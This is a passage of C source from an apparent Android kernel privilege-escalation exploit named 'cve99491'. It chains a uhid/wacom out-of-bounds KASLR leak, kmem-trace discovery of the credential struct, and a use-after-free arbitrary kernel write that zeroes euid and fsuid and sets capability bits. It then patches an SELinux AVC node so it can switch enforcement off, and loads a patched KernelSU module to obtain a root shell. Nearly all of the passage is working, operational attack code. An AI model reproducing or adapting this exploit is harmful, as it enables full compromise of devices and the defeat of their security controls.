                (int)trace_u32(b, p + 4) == pid) {
                size_t elen = total - (p - o);
                unsigned long long site = trace_u64(b, p + 8);
                unsigned long long ptr = trace_u64(b, p + 16);
                unsigned long long req = trace_u64(
                    b, p + ((kp.trace_layout == 618 && elen >= 61) ? 32 : 24));
                g_tr_pidhit++;
                if (req == kp.cred_req) {
                    g_tr_reqhit++;
                    if (getenv("CHAIN_DEBUG") && g_tr_reqhit <= 12)
                        fprintf(stderr, "[t] req=0xb0 site=%#llx ptr=%#llx\n",
                                site, ptr);
                }
                if ((site & 0x1fffff) == kp.cred_site_low21 || kp.cred_site_low21 == 0)
                    g_tr_sitehit++;
                if (req == kp.cred_req &&
                    ((site & 0x1fffff) == kp.cred_site_low21 || kp.cred_site_low21 == 0)) {
                    last = ptr;
                    pending = ptr;
                    int dup = 0;
                    for (int k = 0; k < g_tr_npts; k++)
                        if (g_tr_ptrs[k] == ptr)
                            dup = 1;
                    if (!dup && g_tr_npts < 8)
                        g_tr_ptrs[g_tr_npts++] = ptr;
                } else if (pending &&
                           req >= kp.blob_req_min && req <= kp.blob_req_max &&
                           ((site & 0x1fffff) == kp.blob_site_low21 || kp.blob_site_low21 == 0)) {
                    if (g_npairs < 8) {
                        g_pair_cred[g_npairs] = pending;
                        g_pair_blob[g_npairs] = ptr;
                        g_npairs++;
                    }
                    pending = 0;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return last;
}

/* avc_alloc_node's kmem_cache_alloc returns at ...88aca00, so the
 * call-site low21 is 0xaca00.  A hit gives the freshly allocated
 * avc_node whose avd.allowed can then be patched. */
#define AVC_SITE_LOW21 0xaca00UL

static unsigned g_avc_records;
static unsigned long long g_avc_last_ptr;
static unsigned long long trace_avc_ptr(const unsigned char *b, size_t n,
                                        int pid) {
    unsigned long long last = 0;
    g_avc_records = 0;
    for (size_t base = 0; base + TR_PAGE <= n; base += TR_PAGE) {
        unsigned long long commit = trace_u64(b, base + 8);
        size_t o = base + 16, end = base + 16 + commit;
        if (end > base + TR_PAGE)
            end = base + TR_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = trace_u32(b, o), tl = hdr & 31, td = hdr >> 5;
            size_t total;
            int data = 0;
            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + trace_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + trace_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 28 && p + 41 <= end) {
                unsigned long long site;
                unsigned long long ptr;

                if ((int)trace_u32(b, p + 4) != pid) {
                    if (total < 4)
                        break;
                    o += total;
                    continue;
                }
                site = trace_u64(b, p + 8);
                ptr = trace_u64(b, p + 16);
                {
                    size_t elen = total - (p - o);
                    unsigned long long req = trace_u64(
                        b, p + ((kp.trace_layout == 618 && elen >= 61) ? 32 : 24));

                    if (req == kp.avc_req) {
                        g_avc_records++;
                        g_avc_last_ptr = ptr;
                        if (((site & 0x1fffff) == kp.avc_site_low21 ||
                             kp.avc_site_low21 == 0))
                            last = ptr;
                    }
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return last;
}

static long trace_read_cpu(int cpu, unsigned char *buf, size_t cap) {
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR_PATH "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap) {
        ssize_t n = read(fd, buf + tot, cap - tot);
        if (n <= 0)
            break;
        tot += (size_t)n;
    }
    close(fd);
    return (long)tot;
}

/* The 4th field of the Uid: line in /proc/self/status is the fsuid. */
static unsigned child_fsuid(void) {
    char sb[2048];
    int f = open("/proc/self/status", O_RDONLY);
    unsigned a = 0, b = 0, c = 0, d = 0;

    if (f < 0)
        return 0xffffffffu;
    {
        int n = (int)read(f, sb, sizeof(sb) - 1);

        close(f);
        if (n <= 0)
            return 0xffffffffu;
        sb[n] = 0;
    }
    {
        char *p = strstr(sb, "\nUid:");

        if (!p)
            return 0xffffffffu;
        if (sscanf(p + 1, "Uid:\t%u\t%u\t%u\t%u", &a, &b, &c, &d) < 4)
            return 0xffffffffu;
    }
    return d;
}

static int selinux_enforce_now(void) {
    char b[8];
    int f = open("/sys/fs/selinux/enforce", O_RDONLY);
    int n;

    if (f < 0)
        return -1;
    n = (int)read(f, b, sizeof(b) - 1);
    close(f);
    if (n <= 0)
        return -1;
    b[n] = 0;
    return atoi(b);
}

/*
 * The reclaimed 2k input_dev carries its own vals pointer in the spray
 * payload, so the pad MUTE report's input_handle_event() performs
 *   dev->vals[dev->num_vals++] = {EV_SW, SW_MUTE_DEVICE, 0}
 * with a fully controlled vals pointer: a fixed 8-byte write at an
 * arbitrary kernel address, with no indirect call (so classic CFI never
 * runs).  The pad descriptor maps the touch switch to TOUCHONOFF, so the
 * stored value is 0 and the word is 05 00 0e 00 00 00 00 00.
 *
 * With syn_zero the sw[] state bit is left clear: the switch event is
 * dropped and input_sync()'s EV_SYN/SYN_REPORT appends input_value(0,0,0)
 * instead -- eight clean zero bytes at the same target.
 */
static void build_direct_uaf(unsigned char *buf, size_t len,
                             unsigned long long vals_target, int syn_zero) {
    /* input_event() gates on dev->evbit: the SYN zero store needs EV_SYN
     * (bit0) to be accepted, while the switch-word path stays exactly as
     * before (no SYN store). */
    unsigned long long evbit = syn_zero ? 0x21ULL : 0x20ULL;
    unsigned long long swbit = 1UL << 14;     /* SW_MUTE_DEVICE */
    unsigned long long sw_state = 1UL << 14;  /* state change 1 -> 0 */
    unsigned num_vals = 0;
    unsigned max_vals = 0x1000;               /* no flush */

    memset(buf, 0, len);
    memcpy(buf + kp.dev_evbit, &evbit, 8);
    memcpy(buf + kp.dev_swbit, &swbit, 8);
    /* input_dev+0x1d0 is the inline sw[] state bitmap (measured from
     * input_handle_event: EV_SW loads swbit at +0xc8 and sw at +0x1d0).
     * The TOUCHONOFF pad report carries value 0.  With the state
     * asserted the switch itself is stored (fixed word); with the state
     * left clear the switch is dropped and input_sync's EV_SYN stores
     * eight zero bytes at vals[0] instead.  event@0x1f0 and grab@0x1f8
     * stay 0. */
    if (!syn_zero)
        memcpy(buf + kp.dev_sw, &sw_state, 8);
    memcpy(buf + kp.dev_num_vals, &num_vals, 4);
    memcpy(buf + kp.dev_max_vals, &max_vals, 4);
    memcpy(buf + kp.dev_vals, &vals_target, 8);
}

static int direct_uaf_write_ex(unsigned long long target, long spray_n,
                               long spread_ms, int syn_zero) {
    unsigned char *spray_buf = malloc(SPRAY_LEN);
    int fd_t = -1, fd_p = -1;
    int rc = -1;

    if (!spray_buf)
        return -1;
    fd_t = uhid_open();
    fd_p = uhid_open();
    if (fd_t < 0 || fd_p < 0)
        goto out;
    if (uhid_create(fd_t, NAME_TOUCH, PHYS_COMMON, 0x1101, rdesc_touch,
                    sizeof(rdesc_touch)) < 0 ||
        uhid_create(fd_p, NAME_PAD, PHYS_COMMON, 0x1102, rdesc_pad,
                    sizeof(rdesc_pad)) < 0)
        goto out;
    {
        long t0 = now_ms();

        pump_until_start(fd_t, t0 + 1500);
        pump_until_start(fd_p, t0 + 1500);
    }
    uhid_destroy(fd_t);
    build_direct_uaf(spray_buf, SPRAY_LEN, target, syn_zero);
    spray_spread(spray_n, spread_ms, spray_buf);
    {
        unsigned char rep[2] = { 0x02, 0x02 }; /* MUTE_DEVICE=1 */

        uhid_input_raw(fd_p, rep, sizeof(rep));
    }
    usleep(150000);
    rc = 0;
out:
    if (fd_p >= 0) {
        uhid_destroy(fd_p);
        close(fd_p);
    }
    if (fd_t >= 0) {
        uhid_destroy(fd_t);
        close(fd_t);
    }
    free(spray_buf);
    return rc;
}

static int direct_uaf_write(unsigned long long target, long spray_n,
                            long spread_ms) {
    return direct_uaf_write_ex(target, spray_n, spread_ms, 0);
}

/* Eight clean zero bytes at `target`: the switch event is dropped (its
 * state bit is left clear) and input_sync stores EV_SYN{0,0,0} at
 * vals[0].  Used to zero cred->fsuid/fsgid (+0x1c) so root-owned files
 * pass the DAC owner check without CAP_DAC_OVERRIDE. */
static int direct_uaf_write_syn(unsigned long long target, long spray_n,
                                long spread_ms) {
    return direct_uaf_write_ex(target, spray_n, spread_ms, 1);
}

/* --- wait-mode child -------------------------------------------------- */

#define CHILD_HELLO 0x9941cce1U

/*
 * The parent leaves /data/local/tmp/ksu.cfg with "inline <slide> <syms>"
 * before releasing the child.  Everything after the credential patch
 * talks through files, so the log is redirected to cve99491.ksu.out.
 * The permissive window was opened by the parent's AVC grant; the loader
 * only has to cover finit_module and then restore Enforcing.
 */
static void ksu_child_stage(void) {
    char cb[256], mode[16] = "", syms[160] = "";
    unsigned long long slide = 0;
    int cf = open("/data/local/tmp/ksu.cfg", O_RDONLY);
    int n, rc;

    if (cf < 0)
        return;
    n = (int)read(cf, cb, sizeof(cb) - 1);
    close(cf);
    unlink("/data/local/tmp/ksu.cfg");
    if (n <= 0)
        return;
    cb[n] = 0;
    if (sscanf(cb, "%15s %llx %159s", mode, &slide, syms) < 2)
        return;
    if (!syms[0])
        snprintf(syms, sizeof syms, "%s",
                 "/data/local/tmp/ko-syms-5.15.178.txt");
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("KSU mode=%s slide=%#llx\n", mode, slide);
    (void)fsync(1);
    rc = ksu_boot_inline(slide, syms);
    printf("KSU_DONE rc=%d\n", rc);
}

/* Final stage of the oracle child: run one diagnostic exec, prove the
 * in-process credential, then hand the shell init-owned fds and exec it.
 * Returns only if execl() fails; the caller exits. */
static void child_final_stage(void) {
    {
        int of = open("/data/local/tmp/cve99491.ksu.out",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (of >= 0) {
            dup2(of, 1);
            dup2(of, 2);
            if (of > 2)
                close(of);
        }
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("CHILD_FINAL pid=%d uid=%u\n", (int)getpid(),
           (unsigned)getuid());
    ksu_child_stage();
    /* Diagnostic: fork + exec one system binary with init-owned fds;
     * record the wait status in the proof file. */
    int exec_status = -2;
    {
        pid_t p = fork();
        if (p == 0) {
            int of = open("/data/local/tmp/cve99491.exec.out",
                          O_CREAT | O_WRONLY | O_TRUNC, 0644);
            if (of >= 0) {
                dup2(of, 1);
                dup2(of, 2);
                if (of > 2)
                    close(of);
            }
            int nf = open("/dev/null", O_RDONLY);
            if (nf >= 0) {
                dup2(nf, 0);
                if (nf > 2)
                    close(nf);
            }
            for (int i = 3; i < 64; i++)
                close(i);
            execl("/system/bin/getenforce", "getenforce", (char *)NULL);
            _exit(111);
        }
        if (p > 0) {
            int ws = 0;
            waitpid(p, &ws, 0);
            exec_status = ws;
        }
    }
    /* In-process proof: this task now runs with the patched credential. */
    {
        int pf = open("/data/local/tmp/cve99491.out",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (pf >= 0) {
            char ctx[128] = "?";
            int cf = open("/proc/self/attr/current", O_RDONLY);
            if (cf >= 0) {
                int n = (int)read(cf, ctx, sizeof(ctx) - 1);
                close(cf);
                if (n > 0) {
                    while (n > 0 && (ctx[n - 1] == '\n' || ctx[n - 1] == 0))
                        n--;
                    ctx[n] = 0;
                }
            }
            char caps[512] = "";
            int sf = open("/proc/self/status", O_RDONLY);
            if (sf >= 0) {
                char sb[4096];
                int sl = (int)read(sf, sb, sizeof(sb) - 1);
                close(sf);
                if (sl > 0) {
                    sb[sl] = 0;
                    static const char *keys[] = {
                        "CapInh:", "CapPrm:", "CapEff:", "CapBnd:"
                    };
                    size_t cl = 0;
                    for (int k = 0; k < 4; k++) {
                        char *p = strstr(sb, keys[k]);
                        if (!p)
                            continue;
                        char *e = strchr(p, '\n');
                        int len = e ? (int)(e - p) : (int)strlen(p);
                        if (cl + (size_t)len + 2 < sizeof(caps)) {
                            memcpy(caps + cl, p, (size_t)len);
                            cl += (size_t)len;
                            caps[cl++] = '\n';
                            caps[cl] = 0;
                        }
                    }
                }
            }
            char out[768];
            int on = snprintf(out, sizeof out,
                              "CHILD uid=%u euid=%u gid=%u pid=%d\n"
                              "ctx=%s\n%s"
                              "exec_status=%#x (0=ran, status<<8 =failed, "
                              "low7=signal)\n",
                              (unsigned)getuid(), (unsigned)geteuid(),
                              (unsigned)getgid(), (int)getpid(), ctx, caps,
                              (unsigned)exec_status);
            (void)!write(pf, out, (size_t)on);
            close(pf);
        }
    }
    /* Hand the shell fds opened by this (ksu) domain: inherited
     * shell-labelled fds would be denied by the fd-use check after the
     * domain move. */
    {
        int of = open("/data/local/tmp/cve99491.sh.out",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (of >= 0) {
            dup2(of, 1);
            dup2(of, 2);
            if (of > 2)
                close(of);
        }
        int nf = open("/dev/null", O_RDONLY);
        if (nf >= 0) {
            dup2(nf, 0);
            if (nf > 2)
                close(nf);
        }
        for (int i = 3; i < 64; i++)
            close(i);
    }
    execl("/system/bin/sh", "sh", "-c",
          "id; echo ---; getenforce; echo ---; "
          "cat /proc/self/attr/current; echo ---; "
          "grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd):' "
          "/proc/self/status",
          (char *)NULL);
}

static int wait_child_main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint32_t hello = CHILD_HELLO;
    (void)!write(4, &hello, sizeof(hello));
    for (;;) {
        char c;
        ssize_t n = read(3, &c, 1);
        uint32_t ids[2];
        if (n <= 0) {
            usleep(10000);
            continue;
        }
        ids[0] = (uint32_t)getuid();
        ids[1] = (uint32_t)getgid();
        if (c == 'X') {
            /* Wait for the flag file the parent creates after the cred
             * patch.  init may open shell_data_file, so the polling keeps
             * working across the SID move. */
            for (int i = 0; i < 1200; i++) {
                int gf = open("/data/local/tmp/go.flag", O_RDONLY);
                if (gf >= 0) {
                    char gb;
                    (void)!read(gf, &gb, 1);
                    close(gf);
                    break;
                }
                usleep(100000);
            }
            child_final_stage();
            _exit(3);
        } else if (c == 'E') {
            /* Userspace side channel for the direct vals path: the
             * caller writes cred+0x10, so euid reports the hit. */
            uint32_t eu = (uint32_t)geteuid();
            (void)!write(4, &eu, sizeof(eu));
        } else if (c == 'C') {
            uint64_t caps[2] = { 0, 0 };
            int sf = open("/proc/self/status", O_RDONLY);
            if (sf >= 0) {
                char sb[4096];
                int sl = (int)read(sf, sb, sizeof(sb) - 1);
                close(sf);
                if (sl > 0) {
                    sb[sl] = 0;
                    char *p = strstr(sb, "CapEff:");
                    if (p)
                        caps[0] = strtoull(p + 7, NULL, 16);
                    p = strstr(sb, "CapBnd:");
                    if (p)
                        caps[1] = strtoull(p + 7, NULL, 16);
                }
            }
            (void)!write(4, caps, sizeof(caps));
        } else if (c == 'B') {
            /* Trigger the setenforce AVC check under the kmem trace and
             * report the new avc_node address.  The enforce file is
             * opened through its owner DAC bits (fsuid 0); the write is
             * denied until the parent patches the node's flags. */
            unsigned long long node = 0;
            long tn = 0;
            unsigned char *tb = malloc(TRACE_BUF_BYTES);
            int cpu = sched_getcpu();
            int open_ok = 0, oerr = 0;
            unsigned fsu = child_fsuid();

            if (cpu < 0)
                cpu = 0;
            trace_reset();
            trace_wr(TR_PATH "/tracing_on", "1");
            {
                int ef = open("/sys/fs/selinux/enforce", O_WRONLY);

                if (ef >= 0) {
                    open_ok = 1;
                    (void)!write(ef, "0", 1);
                    close(ef);
                } else {
                    oerr = errno;
                }
            }
            trace_wr(TR_PATH "/tracing_on", "0");
            if (tb) {
                tn = trace_read_cpu(cpu, tb, TRACE_BUF_BYTES);

                /* Without a successful open the write never reaches
                 * sel_write_enforce, so any avc allocation in the
                 * window belongs to another check and must not be
                 * patched. */
                if (open_ok && tn > 0) {
                    (void)trace_avc_ptr(tb, (size_t)tn, (int)getpid());
                    node = g_avc_last_ptr;
                }
                free(tb);
            }
            printf("[child] avc trigger open=%d errno=%d fsuid=%u node=%#llx "
                   "tn=%ld records=%u\n",
                   open_ok, oerr, fsu, node, tn, g_avc_records);
            {
                struct {
                    uint64_t node;
                    uint32_t open_ok;
                    uint32_t oerr;
                    uint32_t fsuid;
                } rb;

                rb.node = node;
                rb.open_ok = (uint32_t)open_ok;
                rb.oerr = (uint32_t)oerr;
                rb.fsuid = fsu;
                (void)!write(4, &rb, sizeof(rb));
            }
        } else if (c == 'R') {
            uint32_t enf = 0xffffffffu;
            int ef = open("/sys/fs/selinux/enforce", O_WRONLY);

            if (ef >= 0) {
                (void)!write(ef, "0", 1);
                close(ef);
            }
            enf = (uint32_t)selinux_enforce_now();
            printf("[child] avc retry enforce=%u\n", enf);
            (void)!write(4, &enf, sizeof(enf));
        } else if (c == 'Q') {
            _exit(0);
        }
    }
}

static int read_full(int fd, void *buf, size_t n) {
    unsigned char *p = buf;
    size_t got = 0;
    while (got < n) {
        ssize_t r = read(fd, p + got, n - got);
        if (r <= 0)
            return -1;
        got += (size_t)r;
    }
    return 0;
}

/*
 * Fork a child that re-execs this binary in wait mode on `cpu`, so its
 * exec allocates a private committed cred we can leak and then patch.
 * Returns the pid; fd 3 (commands) / fd 4 (status) are handed back.
 */

/*
 * Fork a child that re-execs this binary in wait mode on `cpu`, so its
 * exec allocates a private committed cred we can leak and then patch.
 * Returns the pid; fd 3 (commands) / fd 4 (status) are handed back.
 */
static pid_t spawn_wait_child(int cpu, int *go_out, int *st_out) {
    int go[2], st[2];
    if (pipe(go) || pipe(st))
        return -1;
    pid_t p = fork();
    if (p == 0) {
        char ch;
        int g2, s2;
        cpu_set_t set;
        close(go[1]);
        close(st[0]);
        CPU_ZERO(&set);
        CPU_SET(cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
        g2 = fcntl(go[0], F_DUPFD, 20);
        s2 = fcntl(st[1], F_DUPFD, 20);
        if (g2 < 0 || s2 < 0)
            _exit(125);
        close(go[0]);
        close(st[1]);
        dup2(g2, 3);
        close(g2);
        dup2(s2, 4);
        close(s2);
        if (read(3, &ch, 1) != 1)
            _exit(126);
        execl("/proc/self/exe", "exp", "wait", (char *)NULL);
        _exit(127);
    }
    if (p < 0) {
        close(go[0]);
        close(go[1]);
        close(st[0]);
        close(st[1]);
        return -1;
    }
    close(go[0]);
    close(st[1]);
    *go_out = go[1];
    *st_out = st[0];
    return p;
}

static void usage(const char *p) {
    fprintf(stderr,
        "usage: %s [--spray N] [--spread N MS] [--cpu N] [--syms PATH]\n"
        "          [--profile PATH] [--slide HEX] [--leak-only]\n"
        "  Runs the full EXP chain: wacom OOB KASLR leak, kmem-trace cred\n"
        "  discovery, direct vals[] credential patch, AVC-setenforce grant,\n"
        "  patched kernelsu.ko load, ksud install and GRANT_ROOT.\n"
        "  --profile loads a per-kernel offset file (default\n"
        "  /data/local/tmp/cve99491.profile when present); --slide skips the\n"
        "  KASLR leak; --leak-only prints the leaked slide and exits.\n"
        "  Needs /data/local/tmp/ksu-a13.ko and the kernel symbol table\n"
        "  (default /data/local/tmp/ko-syms-5.15.178.txt, --syms overrides).\n",
        p);
}

int main(int argc, char **argv) {
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main();

    setvbuf(stdout, NULL, _IONBF, 0);

    long spray_n = 4096, spread_ms = 300;
    int cpu = 0, leak_only = 0;
    const char *syms = "/data/local/tmp/ko-syms-5.15.178.txt";
    const char *profile = getenv("CVE99491_PROFILE");
    int profile_explicit = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--spray") && i + 1 < argc)
            spray_n = atol(argv[++i]);
        else if (!strcmp(argv[i], "--spread") && i + 2 < argc) {
            spray_n = atol(argv[++i]);
            spread_ms = atol(argv[++i]);
        } else if (!strcmp(argv[i], "--cpu") && i + 1 < argc)
            cpu = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--syms") && i + 1 < argc)
            syms = argv[++i];
        else if (!strcmp(argv[i], "--profile") && i + 1 < argc) {
            profile = argv[++i];
            profile_explicit = 1;
        } else if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
            kp.slide = strtoull(argv[++i], NULL, 0);
            kp.have_slide = 1;
        } else if (!strcmp(argv[i], "--leak-only"))
            leak_only = 1;
        else {
            usage(argv[0]);
            return 2;
        }
    }

    if (!profile)
        profile = "/data/local/tmp/cve99491.profile";
    if (profile_explicit || access(profile, R_OK) == 0) {
        if (load_profile(profile) != 0)
            return 1;
        printf("[*] profile=%s worker=%#llx kaslr_idx=%u dev_vals=%u cred_req=%u "
               "euid_off=%#x cap=%#x/%#x/%#x fsuid_off=%#x\n",
               profile, kp.worker_link, kp.kaslr_idx, kp.dev_vals, kp.cred_req,
               kp.cred_euid_off, kp.cred_cap1, kp.cred_cap2, kp.cred_cap3,
               kp.cred_fsuid_off);
    }
    printf("[*] spray=%ld spread=%ldms\n", spray_n, spread_ms);

    /* Coordination/proof files are recreated per run; a stale go.flag
     * would let the child leave its wait loop early. */
    unlink("/data/local/tmp/go.flag");
    unlink("/data/local/tmp/ksu.cfg");
    unlink("/data/local/tmp/cve99491.out");
    unlink("/data/local/tmp/cve99491.exec.out");
    unlink("/data/local/tmp/cve99491.sh.out");
    unlink("/data/local/tmp/cve99491.ksu.out");
    /* The final stage runs with fsuid 0 after the credential patch and
     * cannot create files in this 0771 directory (other has x only).
     * Pre-create the proof files world-writable so its opens keep
     * working past the fsuid change. */
    {
        static const char *logs[] = {
            "/data/local/tmp/cve99491.out",
            "/data/local/tmp/cve99491.exec.out",
            "/data/local/tmp/cve99491.sh.out",
            "/data/local/tmp/cve99491.ksu.out",
        };

        for (unsigned i = 0; i < sizeof(logs) / sizeof(logs[0]); i++) {
            int lf = open(logs[i], O_CREAT | O_WRONLY, 0666);

            if (lf >= 0) {
                fchmod(lf, 0666);
                close(lf);
            }
        }
    }

    {
        cpu_set_t set;

        CPU_ZERO(&set);
        CPU_SET(cpu, &set);
        if (sched_setaffinity(0, sizeof(set), &set) != 0) {
            perror("sched_setaffinity");
            return 1;
        }
    }

    /* 1. KASLR: worker.func low/high through the wacom OOB read.  A profile
     *    may carry a slide measured by the 98499 leak (e.g. uhidleak). */
    unsigned long long worker = 0, slide = 0;

    if (kp.have_slide) {
        slide = kp.slide;
        printf("[+] slide (profile) = %#llx\n", slide);
    } else {
        unsigned lo = 0, hi = 0;
        int leak_ok = 0;
        /* 5.15..6.12 use 2288; 6.18 moved uhid input_buf by -8 bytes and uses
         * 2286.  Try the profile's index first, then the neighbouring even
         * words, and accept only a value consistent with a 2 MiB-aligned
         * KASLR slide and a canonical kernel text pointer. */
        static const int idx_delta[] = { 0, -2, 2, -4, 4 };
        for (size_t c = 0; c < sizeof(idx_delta) / sizeof(idx_delta[0]) && !leak_ok; c++) {
            unsigned idx = (unsigned)((int)kp.kaslr_idx + idx_delta[c]);

            for (int a = 0; a < 2 && !leak_ok; a++) {
                unsigned long long w, s;

                if (a || c)
                    usleep(200000);
                lo = hi = 0;
                if (leak_word(idx, &lo) != 0 || leak_word(idx + 1, &hi) != 0)
                    continue;
                w = ((unsigned long long)hi << 32) | lo;
                s = w - kp.worker_link;
                if ((s & 0x1fffffULL) != 0 || (w >> 48) != 0xffffULL)
                    continue;
                worker = w;
                slide = s;
                leak_ok = 1;
                if (idx != kp.kaslr_idx)
                    printf("[*] kaslr index adjusted %u -> %u\n",
                           kp.kaslr_idx, idx);
            }
        }
        if (!leak_ok) {
            fprintf(stderr, "[-] KASLR leak failed (use --slide or --profile slide=)\n");
            return 1;
        }
        printf("[+] worker.func = %#llx  slide = %#llx\n", worker, slide);
    }
    if (leak_only)
        return 0;

    /* 2. Trace window: the world-writable kmem/rss_stat trigger enables
     *    kmem_cache_alloc/kmalloc for the shell; the child's exec then
     *    exposes its committed cred and SELinux blob in the raw ring. */
    if (trace_prepare() != 0) {
        fprintf(stderr, "[-] trace prepare failed\n");
        return 1;
    }
    if (spray_setup() < 0)
        return 1;

    unsigned char *raw = malloc(TRACE_BUF_BYTES);

    if (!raw) {
        fprintf(stderr, "[-] trace buffer alloc failed\n");
        return 1;
    }

    /* 3. Spawn the wait child and capture its exec cred.  The first
     *    allocation of the window is the committed exec cred; a window
     *    with fewer than two cred/blob pairs never contained it. */
    unsigned long long R = 0;
    pid_t child = -1;
    int go = -1, st = -1;

    for (int i = 0; i < 96 && !R; i++) {
        int g = -1, s = -1;
        int hello_ok = 0;
        pid_t c = spawn_wait_child(cpu, &g, &s);

        if (c < 0)
            break;
        trace_reset();
        trace_wr(TR_PATH "/tracing_on", "1");
        (void)!write(g, "A", 1);
        /* The child writes CHILD_HELLO after execve completes, i.e. after
         * prepare_creds allocated and commit_creds installed the live
         * cred.  Waiting for it instead of a fixed sleep puts that
         * allocation in every trace window even under load. */
        {
            uint32_t h = 0;
            int hn = read_full(s, &h, sizeof(h));

            hello_ok = hn == 0 && h == CHILD_HELLO;
            if (!hello_ok)
                printf("[-] child %d exec handshake failed (n=%d)\n",
                       (int)c, hn);
        }
        trace_wr(TR_PATH "/tracing_on", "0");
        long n = trace_read_cpu(cpu, raw, TRACE_BUF_BYTES);

        if (n > 0) {
            (void)trace_cred_ptr(raw, n, (int)c);
            printf("[*] trace pairs=%d\n", g_npairs);
            if (hello_ok && g_npairs >= kp.min_pairs) {
                R = g_pair_cred[0];
                child = c;
                go = g;
                st = s;
            }
        }
    }
    free(raw);
    if (!R) {
        fprintf(stderr, "[-] no reachable child cred\n");
        return 1;
    }
    printf("[+] child %d cred = %#llx (direct vals path)\n", (int)child, R);

    /* 4. Locate the live cred with a userspace oracle: a direct vals
     *    store at cred+0x10 leaves sgid = 0x000e0005 and euid = 0,
     *    which the child reports through the status pipe. */
    unsigned long long cand[12], live = 0;
    int nc = 0;

    for (int k = 0; k < g_npairs && nc < 12; k++)
        cand[nc++] = g_pair_cred[k];
    for (int k = 0; k < g_tr_npts && nc < 12; k++) {
        int dup = 0;

        for (int j = 0; j < nc; j++)
            if (cand[j] == g_tr_ptrs[k])
                dup = 1;
        if (!dup)
            cand[nc++] = g_tr_ptrs[k];
    }
    if (!nc)
        cand[nc++] = R;
    printf("[*] probing %d cred candidates (first=%#llx)\n", nc, cand[0]);
    for (int k = 0; k < nc; k++)
        printf("[*] cand[%d]=%#llx\n", k, cand[k]);
    for (int k = 0; k < nc && !live; k++) {
        /* The exec cred is the first allocation in the window; give it
         * more attempts than the aliases. */
        int tries = k == 0 ? 4 : 2;

        for (int t = 0; t < tries && !live; t++) {
            uint32_t eu = 0xffffffffu;

            if (direct_uaf_write(cand[k] + kp.cred_euid_off, spray_n, spread_ms) < 0)
                continue;
            spray_drain();
            if (write(go, "E", 1) != 1)
                break;
            if (read_full(st, &eu, sizeof(eu)) != 0)
                break;
            printf("[*] cand %d/%d try %d euid=%u\n", k + 1, nc, t + 1, eu);
            if (eu == 0)
                live = cand[k];
        }
    }
    if (!live) {
        fprintf(stderr, "[-] no live cred among %d candidates\n", nc);
        return 1;
    }
    R = live;
    printf("[+] live cred %#llx via euid oracle\n", R);

    /* 5. Capabilities: two overlapping stores pin the bits finit_module
     *    (CAP_SYS_MODULE), the enforce write (CAP_MAC_ADMIN) and the
     *    /data/adb opens (CAP_DAC_OVERRIDE) need; a third store keeps
     *    them in cap_bset for exec'd ksud children.  Each store is an
     *    independent UAF fire, so the loop reads eff/bnd back from the
     *    child's /proc/self/status and re-fires only the missing parts.
     *    W3 runs last: its code word is what leaves cap_bset = 0xe. */
    uint64_t caps[2] = { 0, 0 };
    int caps_ok = 0;

    for (int round = 0; round < 8 && !caps_ok; round++) {
        int fired_w2 = 0;

        if ((caps[0] & 0x000000000000000eULL) != 0x000000000000000eULL) {
            (void)direct_uaf_write(R + kp.cred_cap1, spray_n, spread_ms);
            spray_drain();
        }
        if ((caps[0] & 0x0000000e00050000ULL) != 0x0000000e00050000ULL) {
            (void)direct_uaf_write(R + kp.cred_cap2, spray_n, spread_ms);
            spray_drain();
            fired_w2 = 1;
        }
        if ((caps[0] & 0x0005000000000000ULL) != 0x0005000000000000ULL ||
            (caps[1] & 0xffffULL) != 0x0eULL || fired_w2) {
            (void)direct_uaf_write(R + kp.cred_cap3, spray_n, spread_ms);
            spray_drain();
        }
        caps[0] = caps[1] = 0;
        if (write(go, "C", 1) != 1 || read_full(st, caps, sizeof(caps)) != 0)
            break;
        printf("[*] cap_effective=%#llx cap_bnd=%#llx\n",
               (unsigned long long)caps[0], (unsigned long long)caps[1]);
        if (caps[0] == 0x0005000e0005000eULL &&
            (caps[1] & 0xffffULL) == 0x0eULL)
            caps_ok = 1;
    }
    if (!caps_ok) {
        fprintf(stderr, "[-] caps incomplete (eff=%#llx bnd=%#llx)\n",
                (unsigned long long)caps[0], (unsigned long long)caps[1]);
        return 1;
    }

    /* 6. Hand the KSU stage its slide and symbol path; the command pipe
     *    is dead after the domain move, so it is a file. */
    {
        int kf = open("/data/local/tmp/ksu.cfg",
                      O_CREAT | O_WRONLY | O_TRUNC, 0644);

        if (kf >= 0) {
            char kb[320];
            int kn = snprintf(kb, sizeof kb, "inline %#llx %s\n", slide,
                              syms);

            (void)!write(kf, kb, (size_t)kn);
            close(kf);
        }
    }

    /* 7. AVC grant: fsuid 0 lets the child open the root-owned enforce
     *    file through the owner DAC bits; its denied write allocates the
     *    security:setenforce decision node.  AVD_FLAGS_PERMISSIVE
     *    (node+28) makes avc_denied() return 0 for that cached decision,
     *    so the child's own setenforce store is allowed and no
     *    selinux_state memory is touched. */
    int avc_ok = 0;

    if (ksu_preprepare_module(slide, syms) != 0)
        printf("[-] module pre-patch failed\n");
    (void)direct_uaf_write_syn(R + kp.cred_fsuid_off, spray_n, spread_ms);
    spray_drain();
    for (int round = 0; round < 4 && !avc_ok; round++) {
        struct {
            uint64_t node;
            uint32_t open_ok;
